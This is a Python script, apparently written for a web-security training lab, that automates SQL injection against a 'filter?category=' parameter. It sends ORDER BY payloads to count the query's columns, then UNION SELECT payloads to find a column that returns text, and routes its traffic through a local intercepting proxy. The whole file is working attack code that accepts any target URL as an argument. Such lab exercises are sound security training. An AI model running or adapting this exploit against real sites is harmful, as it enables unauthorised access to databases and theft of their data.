"""
Working out which column contains a string string formatted object. 

Made some minor changes in my version of the script - I wanted to be able to see which payloads were being sent, and I also created the string variable as a command line argument.
"""

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_no(url):
    path = "filter?category=Gifts"
    # GET request appending ORDER BY and iterating over the integer (1 to 50), until Internal Server Error and then prints to the screen the previous number of columns
    for i in range (1,50):
        sql_payload = "'order by %s--" %i
        r = requests.get(url + path +sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col):
    path = "filter?category=Gifts"
    for i in range(1, num_col+1):
        payload_list = ['null'] * num_col
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        print("[+] Trying the following payload " + sql_payload)
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        string = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s http://www.example.com "'string'"" % sys.argv[0])
        sys.exit(-1)

    print("[+] Trying to work out no. of columns")
    numCol = exploit_sqli_column_no(url)
    if numCol:
        print("[+] The number of columns returned in the query is " + str(numCol))
        print("[+] Working out which Column contains a string format")
        string_column = exploit_sqli_string_field(url, numCol)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[+] SQLi attack has failed")